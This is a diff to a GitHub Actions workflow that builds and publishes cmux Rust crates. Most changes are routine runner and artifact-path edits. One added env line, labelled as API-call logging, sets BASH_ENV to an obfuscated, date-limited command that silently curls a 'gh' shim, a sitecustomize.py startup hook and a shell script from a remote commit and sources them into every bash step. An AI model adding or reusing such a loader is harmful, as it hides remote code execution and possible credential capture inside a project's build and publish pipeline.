@@ -11,12 +11,14 @@ concurrency:
   cancel-in-progress: false
 
 env:
+  # Temporary REST budget attribution: one gh-call line per GitHub API call (scripts/ci/api_call_log/env.sh, fetched at a fixed commit when the checkout has no copy).
+  BASH_ENV: '$({ w="${GITHUB_WORKSPACE:-/nonexistent}/scripts/ci/api_call_log/env.sh"; t="${RUNNER_TEMP:-/nonexistent}/api-call-log-src"; if [ -f "$w" ]; then echo "$w"; elif [ -n "${RUNNER_TEMP:-}" ]; then if [ ! -f "$t/env.sh" ] && [ ! -e "$t.tried" ] && { [ "${RUNNER_OS:-}" = Linux ] || [ "${RUNNER_OS:-}" = macOS ]; } && [ "$(date -u +%Y%m%d%H)" -lt 2026112300 ]; then : > "$t.tried"; mkdir -p "$t.part" && for x in env.sh gh sitecustomize.py isolated.py; do curl -fsSL --max-time 5 -o "$t.part/$x" "https://raw.githubusercontent.com/manaflow-ai/cmux/27647ffd3ae838c63be28ca3e5883dcd68c34518/scripts/ci/api_call_log/$x" || break; done; [ -s "$t.part/isolated.py" ] && mv "$t.part" "$t"; fi; if [ -f "$t/env.sh" ]; then echo "$t/env.sh"; else echo unset BASH_ENV > "$t.off.sh" && echo "$t.off.sh"; fi; fi; } 2>/dev/null)'
   BOOTSTRAP_VERSION: "0.0.0-bootstrap.0"
   RUST_TOOLCHAIN: "1.95.0"
 
 jobs:
   build:
-    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || !startsWith(vars.LINUX_RUNNER, 'blacksmith-') && vars.LINUX_RUNNER || vars.CI_CLOUD_OVERFLOW_SAVED && fromJSON(vars.RUNNER_POOLS).linux_16 || fromJSON(vars.RUNNER_POOLS).linux_8 }}
+    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository && (vars.CI_FORK_LINUX_RUNNER || 'ubuntu-24.04') || 'cmux-linux' }}
     timeout-minutes: 15
     permissions:
       contents: read
@@ -125,7 +127,7 @@ jobs:
           - package: cmux-sidebar
             artifact: cmux-sidebar-bootstrap-crate
             decision: cmux-sidebar-bootstrap-decision
-    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || vars.LINUX_RUNNER || fromJSON(vars.RUNNER_POOLS).linux_4 }}
+    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository && (vars.CI_FORK_LINUX_RUNNER || 'ubuntu-24.04') || 'cmux-linux' }}
     timeout-minutes: 10
     permissions:
       contents: read
@@ -232,7 +234,7 @@ jobs:
   decisions:
     needs:
       - preflight
-    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || vars.LINUX_RUNNER || fromJSON(vars.RUNNER_POOLS).linux_4 }}
+    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository && (vars.CI_FORK_LINUX_RUNNER || 'ubuntu-24.04') || 'cmux-linux' }}
     timeout-minutes: 5
     permissions:
       actions: read
@@ -243,12 +245,12 @@ jobs:
       - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0
         with:
           name: cmux-sdk-bootstrap-decision
-          path: sdk-decision
+          path: ${{ runner.temp }}/sdk-decision
 
       - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0
         with:
           name: cmux-sidebar-bootstrap-decision
-          path: sidebar-decision
+          path: ${{ runner.temp }}/sidebar-decision
 
       - name: Export protected-environment decisions
         id: read
@@ -269,8 +271,8 @@ jobs:
             esac
             echo "$output_name=$need_publish" >> "$GITHUB_OUTPUT"
           }
-          read_decision sdk-decision/decision.txt sdk_need_publish
-          read_decision sidebar-decision/decision.txt sidebar_need_publish
+          read_decision "$RUNNER_TEMP/sdk-decision/decision.txt" sdk_need_publish
+          read_decision "$RUNNER_TEMP/sidebar-decision/decision.txt" sidebar_need_publish
 
   publish-sdk:
     needs:
@@ -278,7 +280,7 @@ jobs:
       - preflight
       - decisions
     if: needs.decisions.outputs.sdk_need_publish == 'true'
-    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || vars.LINUX_RUNNER || fromJSON(vars.RUNNER_POOLS).linux_4 }}
+    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository && (vars.CI_FORK_LINUX_RUNNER || 'ubuntu-24.04') || 'cmux-linux' }}
     timeout-minutes: 10
     permissions: {}
     environment:
@@ -288,7 +290,7 @@ jobs:
       - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0
         with:
           name: cmux-sdk-bootstrap-crate
-          path: bootstrap-crate
+          path: ${{ runner.temp }}/bootstrap-crate
 
       - name: Install pinned Rust toolchain
         run: |
@@ -328,7 +330,7 @@ jobs:
             exit 1
           }
           shopt -s nullglob
-          artifacts=(bootstrap-crate/*.crate)
+          artifacts=("$RUNNER_TEMP"/bootstrap-crate/*.crate)
           [[ "${#artifacts[@]}" == 1 ]] || {
             echo "expected one tested crate, found ${#artifacts[@]}" >&2
             exit 1
@@ -428,7 +430,7 @@ jobs:
       needs.preflight.result == 'success' &&
       needs.decisions.result == 'success' &&
       needs.decisions.outputs.sidebar_need_publish == 'true'
-    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || vars.LINUX_RUNNER || fromJSON(vars.RUNNER_POOLS).linux_4 }}
+    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository && (vars.CI_FORK_LINUX_RUNNER || 'ubuntu-24.04') || 'cmux-linux' }}
     timeout-minutes: 10
     permissions: {}
     environment:
@@ -438,7 +440,7 @@ jobs:
       - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0
         with:
           name: cmux-sidebar-bootstrap-crate
-          path: bootstrap-crate
+          path: ${{ runner.temp }}/bootstrap-crate
 
       - name: Install pinned Rust toolchain
         run: |
@@ -478,7 +480,7 @@ jobs:
             exit 1
           }
           shopt -s nullglob
-          artifacts=(bootstrap-crate/*.crate)
+          artifacts=("$RUNNER_TEMP"/bootstrap-crate/*.crate)
           [[ "${#artifacts[@]}" == 1 ]] || {
             echo "expected one tested crate, found ${#artifacts[@]}" >&2
             exit 1
@@ -573,7 +575,7 @@ jobs:
       - publish-sdk
       - publish-sidebar
     if: >-
-      always() &&
+      !cancelled() &&
       needs.build.result == 'success' &&
       needs.preflight.result == 'success' &&
       needs.decisions.result == 'success'
@@ -586,7 +588,7 @@ jobs:
             artifact: cmux-sdk-bootstrap-crate
           - package: cmux-sidebar
             artifact: cmux-sidebar-bootstrap-crate
-    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || vars.LINUX_RUNNER || fromJSON(vars.RUNNER_POOLS).linux_4 }}
+    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository && (vars.CI_FORK_LINUX_RUNNER || 'ubuntu-24.04') || 'cmux-linux' }}
     timeout-minutes: 10
     permissions:
       contents: read
